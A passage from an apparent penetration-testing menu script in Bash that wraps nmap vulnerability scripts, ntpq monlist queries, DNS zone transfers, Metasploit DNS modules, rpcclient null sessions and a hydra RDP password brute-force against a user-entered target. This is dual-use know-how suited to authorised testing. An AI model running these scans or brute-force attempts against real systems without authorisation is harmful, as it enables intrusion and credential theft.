                                                sudo nmap $FLAG -sU -sV -p $PORT --script "ntp* and (discovery or vuln) and not (dos or brute)" $IP -oN /home/$USER/$FOLDER/$FILENAME
                                            else
                                                echo -e "\n"
                                                sudo nmap $FLAG -sU -sV -p $PORT --script "ntp* and (discovery or vuln) and not (dos or brute)" $IP
                                            fi

                                            unset FILENAME
                                        else
                                            clear
                                            printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sU -sV --script '${PURPLE}ntp* and (discovery or vuln) and not (dos or brute)${YELLOW}' -p 123 ${PURPLE}$IP${YELLOW}"
                                            
                                            if [[ $FILENAME != "" ]]
                                            then
                                                printf " -oN ${CYAN}$FILENAME${YELLOW}\n\n"
                                                sudo nmap $FLAG -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 $IP -oN /home/$USER/$FOLDER/$FILENAME
                                            else
                                                echo -e "\n"
                                                sudo nmap $FLAG -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 $IP
                                            fi

                                            unset FILENAME
                                        fi;;


                                    2)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}ntpq -c readlist ${PURPLE}$IP${YELLOW}\n\n";
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                ntpq -c readlist $IP;printf "\n";;

                                    3)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}ntpq -c readvar ${PURPLE}$IP${YELLOW}\n\n";
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                ntpq -c readvar $IP;printf "\n";;

                                    4)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}ntpq -c peers ${PURPLE}$IP${YELLOW}\n\n";
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                ntpq -c peers $IP;printf "\n";;

                                    5)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}ntpq -c associations ${PURPLE}$IP${YELLOW}\n\n";
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                ntpq -c associations $IP; printf "\n";;

                                    6)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}ntpq -c monlist ${PURPLE}$IP${YELLOW}\n\n";
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                ntpq -c monlist $IP;printf "\n";;

                                    7)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}ntpq -c listpeers ${PURPLE}$IP${YELLOW}\n\n";
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                ntpq -c listpeers $IP;printf "\n";;

                                    8)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}ntpq -c sysinfo ${PURPLE}$IP${YELLOW}\n\n";
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                ntpq -c sysinfo $IP;printf "\n";;

                                    9)
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;     
        
                                    10)
                                        clear; 
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;printf "\n"
                                        printf "${WHITE}Insert Port:\n"${NC}
                                        read -e  PORT;printf "\n"                                      

                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;         

                                    11)
                                        clear;
                                        printf "Values Cleared!\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        unset IP
                                        unset PORT;; 

                                    0)
                                        clear;
                                        break;;

                                esac
                        done;;

#dns
                    6)
                        while : ; do

                            printf "${WHITE}Select An Option:${NC}\n\n"
                            echo -e "${CYAN}1. Banner Grab ${NC}" 
                            echo -e "${CYAN}2. Nmap Vuln Scan ${NC}"  
                            echo -e "${CYAN}3. Zone Transfer ${NC}"  
                            echo -e "${CYAN}4. Enumerate a DC via DNS ${NC}"  
                            echo -e "${CYAN}5. MetaSploit DNS Enumeration ${NC}"
                            echo -e "${GREEN}6. Show Values ${NC}"
                            echo -e "${GREEN}7. Set Values ${NC}"
                            echo -e "${GREEN}8. Clear Values ${NC}"
                            echo -e "${YELLOW}0. Back ${NC}\n"
                            echo -n -e "${RED}Enter selection [0-8]: ${NC}"
                            printf ${WHITE};
                            read -e  -r dnss;
                            printf "\n";clear;

                                case $dnss in

                                    1)
                                        while [[ $DOMAINHOST == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert DNS:\n";printf "${NC}";
                                                read -e  DOMAINHOST;
                                                printf "${WHITE}DNS: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}dig version.bind CHAOS TXT ${PURPLE}$DOMAINHOST${YELLOW}\n\n";
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                dig version.bind CHAOS TXT $DOMAINHOST;printf "\n";;

                                    2)
                                        while [[ $IP == "" ]]
                                        do
                                            printf "${WHITE}"; printf "Insert Target IP Address:\n"; printf "${NC}"
                                            read -e IP
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"

                                            printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 53${WHITE}):\n"; printf "${NC}"
                                            read -e PORT
                                            printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"

                                            printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}"
                                            read -e FLAG
                                            printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"

                                            printf "${WHITE}"; printf "Insert File Name (optional):\n"; printf "${NC}"
                                            read -e FILENAME
                                            printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"

                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                        done

                                        if [[ $PORT != "" ]]
                                        then
                                            clear
                                            printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                            printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -n -p ${PURPLE}$PORT${YELLOW} --script '(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport' ${PURPLE}$IP${YELLOW}"
                                            
                                            if [[ $FILENAME != "" ]]
                                            then
                                                printf " -oN ${CYAN}$FILENAME${YELLOW}\n\n"
                                                sudo nmap $FLAG -n -p $PORT --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" $IP -oN /home/$USER/$FOLDER/$FILENAME
                                            else
                                                echo -e "\n"
                                                sudo nmap $FLAG -n -p $PORT --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" $IP
                                            fi

                                            unset FILENAME
                                        else
                                            clear
                                            printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -n --script '(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport' -p 53 ${PURPLE}$IP${YELLOW}"
                                            
                                            if [[ $FILENAME != "" ]]
                                            then
                                                printf " -oN ${CYAN}$FILENAME${YELLOW}\n\n"
                                                sudo nmap $FLAG -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" -p 53 $IP -oN /home/$USER/$FOLDER/$FILENAME
                                            else
                                                echo -e "\n"
                                                sudo nmap $FLAG -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" -p 53 $IP
                                            fi

                                            unset FILENAME
                                        fi;;

                                    3)
                                        while [[ $IP == "" || $DOMAINHOST == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert Domain Host:\n";printf "${NC}";
                                                read -e  DOMAINHOST;
                                                printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"                                                      
                                                echo -e "${NC}-------------------------------------------${NC}\n"               
                
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n";
                                                printf "${WHITE}Executing command: ${YELLOW}dig axfr ${PURPLE}$IP${YELLOW} && dig axfr ${PURPLE}@$IP${YELLOW} ${PURPLE}$DOMAINHOST${YELLOW} && fierce --domain ${PURPLE}$DOMAINHOST${YELLOW}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                dig axfr @$IP && dig axfr @$IP $DOMAINHOST && fierce --domain $DOMAINHOST;printf "\n";;

                                    4)
                                        while [[ $DOMAINHOST == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert DNS:\n";printf "${NC}";
                                                read -e  DOMAINHOST;
                                                printf "${WHITE}DNS: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}Enumerating ${PURPLE}$DOMAINHOST${YELLOW} via DNS\n\n";
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                dig -t _gc._$DOMAINHOST && dig -t _ldap._$DOMAINHOST && dig -t _kerberos._$DOMAINHOST && dig -t _kpasswd._$DOMAINHOST && nmap --script dns-srv-enum --script-args "dns-srv-enum.domain=$DOMAINHOST";printf "\n";;

                                    5)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing ${PURPLE}MetaSploit DNS ${NC}Enumeration\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                msfconsole -q -x "use auxiliary/scanner/dns/dns_amp; set RHOSTS $IP; set RPORT 53; run; exit" && msfconsole -q -x "use auxiliary/gather/enum_dns; set RHOSTS $IP; set RPORT 53; run; exit" 
                                                printf "\n";;

                                    6)
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;     
        
                                    7)
                                        clear; 
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;printf "\n"
                                        printf "${WHITE}Insert Port:\n"${NC}
                                        read -e  PORT;printf "\n"                                      
                                        printf "${WHITE}Insert Domain:\n"${NC}
                                        read -e  DOMAINHOST;printf "\n" 
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;         

                                    8)
                                        clear;
                                        printf "Values Cleared!\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        unset IP
                                        unset PORT
                                        unset DOMAINHOST;; 

                                    0)
                                        clear;
                                        break;;


                                esac
                        done;;
#RDP
                    7)
                        while : ; do

                            printf "${WHITE}Select An Option:${NC}\n\n"
                            echo -e "${CYAN}1. Nmap ${NC}"
                            echo -e "${CYAN}2. Brute Force ${NC}"  
                            echo -e "${GREEN}3. Show Values ${NC}"
                            echo -e "${GREEN}4. Set Values ${NC}"
                            echo -e "${GREEN}5. Clear Values ${NC}"
                            echo -e "${YELLOW}0. Back ${NC}\n"
                            echo -n -e "${RED}Enter selection [0-5]: ${NC}"
                            printf ${WHITE};
                            read -e  -r rdpp;
                            printf "\n";clear;

                                case $rdpp in

                                    1) 

                                        while [[ $IP == "" ]]
                                        do
                                            printf "${WHITE}"; printf "Insert Target IP Address:\n"; printf "${NC}"
                                            read -e IP
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"

                                            printf "${WHITE}"; printf "Insert Port (${YELLOW}ex: 3389${WHITE}):\n"; printf "${NC}"
                                            read -e PORT
                                            printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"

                                            printf "${WHITE}"; printf "Insert FLAG:\n"; printf "${NC}"
                                            read -e FLAG
                                            printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"

                                            printf "${WHITE}"; printf "Insert File Name (optional):\n"; printf "${NC}"
                                            read -e FILENAME
                                            printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"

                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                        done

                                        if [[ $PORT != "" ]]
                                        then
                                            clear
                                            printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                            printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -T4 -p ${PURPLE}$PORT${YELLOW} --script 'rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info' ${PURPLE}$IP${YELLOW}";printf "\n"
                                            
                                            if [[ $FILENAME != "" ]]
                                            then
                                                printf " -oN ${CYAN}$FILENAME${YELLOW}\n\n"
                                                sudo nmap $FLAG -T4 -p $PORT --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" $IP -oN /home/$USER/$FOLDER/$FILENAME;printf "\n"
                                            else
                                                echo -e "\n"
                                                sudo nmap $FLAG -T4 -p $PORT --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" $IP ;printf "\n"
                                            fi

                                            unset FILENAME
                                        else
                                            clear
                                            printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -T4 --script 'rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info' -p 3389 ${PURPLE}$IP${YELLOW}"; printf "\n" 
                                            
                                            if [[ $FILENAME != "" ]]
                                            then
                                                printf " -oN ${CYAN}$FILENAME${YELLOW}\n\n"
                                                sudo nmap $FLAG -T4 --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 $IP -oN /home/$USER/$FOLDER/$FILENAME; printf "\n"
                                            else
                                                echo -e "\n"
                                                sudo nmap $FLAG -T4 --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 $IP; printf "\n"
                                            fi

                                            unset FILENAME
                                        fi;;

                                    2)
                                        while [[ $IP == "" || $PASSWORDLIST == "" || $USERNAME == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert Username:\n";printf "${NC}";
                                                read -e  USERNAME;
                                                printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert Passwords List:\n";printf "${NC}";
                                                read -e  PASSWORDLIST;
                                                printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"                                                      
                                                echo -e "${NC}-------------------------------------------${NC}\n"               
                
                                          done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n";printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n";
                                                printf "${WHITE}Executing command: ${YELLOW}hydra -V -L ${PURPLE}$USERNAME${YELLOW} -P ${PURPLE}$PASSWORDLIST${YELLOW} ${PURPLE}$IP${YELLOW} rdp\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                hydra -V -L $USERNAME -P $PASSWORDLIST $IP rdp;printf "\n";;

                                    3)
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Users List: ${YELLOW}$USERLIST${WHITE}\n\n"
                                        printf "${WHITE}Password List: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;     
        
                                    4)
                                        clear; 
                                        printf "${WHITE}Insert Target IP:\n"${NC}
                                        read -e  IP;printf "\n"
                                        printf "${WHITE}Insert Port:\n"${NC}
                                        read -e  PORT;printf "\n"                                      
                                        printf "${WHITE}Insert Users List:\n"${NC}
                                        read -e  USERLIST;printf "\n"
                                        printf "${WHITE}Insert Password List:\n"${NC}
                                        read -e  PASSWORDLIST;printf "\n" 
                                        clear;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                        printf "${WHITE}Users list: ${YELLOW}$USERLIST${WHITE}\n\n"
                                        printf "${WHITE}Password list: ${YELLOW}$PASSWORDLIST${WHITE}\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n";;         

                                    5)
                                        clear;
                                        printf "Values Cleared!\n\n"
                                        echo -e "${NC}-------------------------------------------${NC}\n"
                                        unset IP
                                        unset PORT
                                        unset PASSWORDLIST
                                        unset USERLIST
                                        ;; 

                                    0)
                                        clear;
                                        break;;
                                esac
                        done;;
#RPC
                    8)

                        while : ; do

                            printf "${WHITE}Select An Option:${NC}\n\n"
                            echo -e "${CYAN}1. Nmap (PortMapper)${NC}" 
                            echo -e "${CYAN}2. Nmap (MS-RPC)${NC}"
                            echo -e "${CYAN}3. RPC Info ${NC}"  
                            echo -e "${CYAN}4. RPC Client ${NC}" 
                            echo -e "${CYAN}5. RPC Client (Null User) ${NC}" 
                            echo -e "${CYAN}6. Impacket RPC Dump ${NC}"    
                            echo -e "${CYAN}7. Whois & RPC Info ${NC}"  
                            echo -e "${GREEN}8. Show Values ${NC}"
                            echo -e "${GREEN}9. Set Values ${NC}"
                            echo -e "${GREEN}10. Clear Values ${NC}"
                            echo -e "${YELLOW}0. Back ${NC}\n"
                            echo -n -e "${RED}Enter selection [0-10]: ${NC}"
                            printf ${WHITE};
                            read -e  -r rpcc;
                            printf "\n";clear;

                                case $rpcc in

                                    1)
                                        while [[ $IP == "" ]]
                                        do      
                                            printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                            
                                            printf "${WHITE}";printf "Insert Port (${YELLOW}ex: 111${WHITE}):\n";printf "${NC}";
                                            read -e  PORT;
                                            printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                            
                                            printf "${WHITE}";printf "Insert FLAG:\n";printf "${NC}";
                                            read -e  FLAG;
                                            printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"
                                            
                                            printf "${WHITE}";printf "Insert File Name (optional):\n";printf "${NC}";
                                            read -e  FILENAME;
                                            printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                            
                                            echo -e "${NC}-------------------------------------------${NC}\n"                   
                                        done

                                        if [[ $PORT != "" ]]
                                        then    
                                            clear;
                                            printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                            printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sSUC -p ${PURPLE}$PORT${YELLOW} ${PURPLE}$IP${YELLOW}\n";
                                            
                                            if [[ $FILENAME != "" ]]
                                            then
                                                printf " -oN ${CYAN}$FILENAME${YELLOW}\n\n";
                                                sudo nmap $FLAG -sSUC -p $PORT $IP -oN /home/$USER/$FOLDER/$FILENAME;printf "\n";
                                            else
                                                echo -e "\n";
                                                sudo nmap $FLAG -sSUC -p $PORT $IP;printf "\n";
                                            fi
                                            
                                            unset FILENAME;
                                        else
                                            clear;
                                            printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -sSUC -p 111 ${PURPLE}$IP${YELLOW}\n";
                                            
                                            if [[ $FILENAME != "" ]]
                                            then
                                                printf " -oN ${CYAN}$FILENAME${YELLOW}\n\n";
                                                sudo nmap $FLAG -sSUC -p 111 $IP -oN /home/$USER/$FOLDER/$FILENAME;printf "\n";
                                            else
                                                echo -e "\n";
                                                sudo nmap $FLAG -sSUC -p 111 $IP;printf "\n";
                                            fi
                                            
                                            unset FILENAME;
                                        fi;;


                                    2)
                                        while [[ $IP == "" ]]
                                        do      
                                            printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                            
                                            printf "${WHITE}";printf "Insert Port (${YELLOW}ex: 135,593${WHITE}):\n";printf "${NC}";
                                            read -e  PORT;
                                            printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                            
                                            printf "${WHITE}";printf "Insert FLAG:\n";printf "${NC}";
                                            read -e  FLAG;
                                            printf "${WHITE}Flag: ${YELLOW}$FLAG${WHITE}\n\n"
                                            
                                            printf "${WHITE}";printf "Insert File Name (optional):\n";printf "${NC}";
                                            read -e  FILENAME;
                                            printf "${WHITE}Filename: ${YELLOW}$FILENAME${WHITE}\n\n"
                                            
                                            echo -e "${NC}-------------------------------------------${NC}\n"                   
                                        done

                                        if [[ $PORT != "" ]]
                                        then    
                                            clear;
                                            printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                            printf "${WHITE}Port: ${YELLOW}$PORT\n\n";
                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -p ${PURPLE}$PORT${YELLOW} --script 'msrpc-enum' ${PURPLE}$IP${YELLOW}\n";
                                            
                                            if [[ $FILENAME != "" ]]
                                            then
                                                printf " -oN ${CYAN}$FILENAME${YELLOW}\n\n";
                                            fi
                                            
                                            echo -e "${NC}-------------------------------------------${NC}"
                                            
                                            if [[ $FILENAME != "" ]]
                                            then
                                                sudo nmap $FLAG -p $PORT --script "msrpc-enum" $IP -oN /home/$USER/$FOLDER/$FILENAME;printf "\n";
                                            else
                                                sudo nmap $FLAG -p $PORT --script "msrpc-enum" $IP;printf "\n";
                                            fi
                                            
                                            unset FILENAME;
                                        else
                                            clear;
                                            printf "${WHITE}Target: ${YELLOW}$IP\n\n";
                                            printf "${WHITE}Executing command: ${YELLOW}nmap $FLAG -T4 --script 'msrpc-enum' -p 135,593 ${PURPLE}$IP${YELLOW}\n";
                                            
                                            if [[ $FILENAME != "" ]]
                                            then
                                                printf " -oN ${CYAN}$FILENAME${YELLOW}\n\n";
                                            fi
                                            
                                            echo -e "${NC}-------------------------------------------${NC}"
                                            
                                            if [[ $FILENAME != "" ]]
                                            then
                                                sudo nmap $FLAG --script "msrpc-enum" -p 135,593 $IP -oN /home/$USER/$FOLDER/$FILENAME;printf "\n";
                                            else
                                                sudo nmap $FLAG --script "msrpc-enum" -p 135,593 $IP;printf "\n";
                                            fi
                                            
                                            unset FILENAME;
                                        fi;;

                                    3)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}rpcinfo -p ${PURPLE}$IP${YELLOW}\n\n";
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                rpcinfo -p $IP;printf "\n";;

                                    4)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}rpcclient ${PURPLE}$IP${YELLOW}\n\n";
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                rpcclient $IP;printf "\n";;

                                    5)
                                        while [[ $IP == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"              
                                        done
                                                clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}Executing command: ${YELLOW}rpcclient -U "" -N ${PURPLE}$IP${YELLOW}\n\n";
                                                echo -e "${NC}-------------------------------------------${NC}"
                                                rpcclient -U "" -N $IP
                                                rpcclient -U% $IP;printf "\n";;

                                    6)
                                        while [[ $IP == ""  ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 135,593${WHITE}):\n";printf "${NC}";
                                                read -e  PORT;
                                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                echo -e "${NC}-------------------------------------------${NC}\n"                   

                                        done

                                                if [[ $PORT != "" ]]
                                                then    
                                                        clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                                        printf "${WHITE}Executing command: ${YELLOW}impacket-rpcdump -p ${PURPLE}$PORT${YELLOW} ${PURPLE}$IP${YELLOW}\n\n";
                                                        echo -e "${NC}-------------------------------------------${NC}"
                                                        impacket-rpcdump  -p $PORT $IP ;printf "\n";
                                                else
                                                        clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                        printf "${WHITE}Executing command: ${YELLOW}impacket-rpcdump -p 135 ${PURPLE}$IP${YELLOW}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}"
                                                        impacket-rpcdump -p 135 $IP ;printf "\n";
                                                fi;;

                                    7)
                                        while [[ $IP == "" || $PORT == "" || $DOMAINHOST == "" ]]
                                        do      
                                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                read -e  IP;
                                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert Port:\n";printf "${NC}";
                                                read -e  PORT;
                                                printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                printf "${WHITE}";printf "Insert Domain:\n";printf "${NC}";
                                                read -e  DOMAINHOST;
                                                printf "${WHITE}Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n"                                                      
                                                echo -e "${NC}-------------------------------------------${NC}\n"               
                
